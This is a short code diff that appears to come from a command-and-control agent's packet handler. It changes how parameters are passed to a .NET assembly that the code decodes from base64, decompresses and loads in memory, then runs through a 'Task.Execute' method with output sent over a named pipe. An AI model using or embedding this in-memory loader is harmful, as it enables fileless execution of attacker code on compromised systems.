@@ -436,10 +436,9 @@ def process_packet(packetType, data, resultID):
             from System.Text import Encoding
 
             parts = data.split(",")
-            params = parts[1 : len(parts)]
+            params = Array[Object](parts[1:len(parts)])
             data_bytes = base64.b64decode(parts[0])
 
-            params = " ".join(params)
             decoded_data = zlib.decompress(data_bytes, -15)
             assemBytes = Array[Byte](decoded_data)
             assembly = Assembly.Load(assemBytes)
@@ -461,7 +460,7 @@ def process_packet(packetType, data, resultID):
                     strmprop = assembly.GetType("Task").GetProperty("OutputStream")
                     strmprop.SetValue(None, pipeClientStream, None)
                     assembly.GetType("Task").GetMethod("Execute").Invoke(
-                        None, Array[Object]({params})
+                        None, params
                     )
                     pipeClientStream.Dispose()
 
